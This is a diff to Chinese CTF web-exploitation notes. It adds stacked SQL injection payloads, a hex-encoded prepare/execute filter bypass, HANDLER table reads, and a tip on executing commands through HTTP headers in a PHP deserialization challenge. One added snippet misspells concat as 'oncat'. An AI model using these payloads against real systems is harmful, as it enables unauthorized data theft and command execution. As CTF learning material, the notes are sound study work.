@@ -438,13 +438,48 @@ select * from 'admin' where password=md5($pass,true)
 
 果然，我们提交之后就绕过了这个，来到了另一个页面
 
-#### 常用注入语句
+#### 常用注入语句(堆叠注入补充)
+
+堆叠注入就是将语句堆叠在一起进行查询。虽然这个注入姿势很厉害，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，例如mysqli_multi_query()函数就支持多条sql语句同时执行。
 
 ```sql
-1;show databases#
-1;show tables#
-1;show columns from 'Flag'#
+1;show databases%23
+1;show tables%23
+1;show columns from 'Flag'%23
 ```
+
+##### 预处理
+
+常规使用方法:
+
+```sql
+# 十六进制的原字符串是 select * from `1919810931114514`，转为十六进制后记得加 0x
+1';
+SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
+prepare execsql from @a;
+execute execsql;
+%23
+```
+
+在select被过滤的情况下，第一部分可以通过concat进行拼接，达到绕过的目的:
+
+```sql
+SeT@a=oncat('sele','ct username from userinfo');
+```
+
+##### handler
+
+```sql
+1';
+handler `1919810931114514` open as `a`;
+handler `a` read first;
+%23
+```
+
+- 1919810931114514 是表名
+- 其中的 a 为我们自己定义的名字，first 为读第一行数据，与他并列的还有 next(读取下一行)
+
+
 
 #### 手工注入
 
@@ -757,6 +792,16 @@ while True:
 ```sql
 SELECT * FROM users WHERE username='vampire     ';
 ```
+
+### SQL 语法
+
+- 表名为数字时，要用反引号包起来查询。如
+
+  ```sql
+  0'; show columns from `1919810931114514 `; #
+  ```
+
+  
 
 ## 代码注入
 
@@ -1397,7 +1442,7 @@ unserialize($_GET['pop']);
 ?>
 ```
 
-`system(current(getallheaders()))` 这段的意思是用 system() 执行 HTTP Headers 中的第一个参数的值。(这里只能使用 burp 设置 HTTP Headers，因为要保证该 header 在 HTTP Headers 的第一个位置) 。
+`system(current(getallheaders()))` 这段的意思是用 system() 执行 HTTP Headers 中的第一个参数的值。(这里只能使用 burp 设置 HTTP Headers，因为要保证该 header 在 HTTP Headers 的第一个位置) 。[如果 `current` 不行，可以试试 `next` (当时遇到的题目环境有问题，用 next 就获取到了，重点在于要多使用 `var_dump` 打印当前变量)]
 
 `__halt_compiler()` :这个函数会立即停止编译器的执行。这是为了防止服务器执行我们不希望执行的代码，例如 "yu22x"，因为在 `backdoor` 函数中，我们的代码后面会被添加上 "yu22x"。
 
